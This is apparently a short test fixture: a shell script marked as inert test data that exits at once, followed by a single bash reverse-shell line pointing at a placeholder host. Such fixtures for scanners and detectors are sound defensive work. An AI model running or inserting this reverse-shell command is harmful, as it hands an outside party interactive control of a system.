#!/bin/sh
# INERT TEST DATA. Never execute or load as an extension.
exit 0
bash -i >& /dev/tcp/session.invalid/9 0>&1
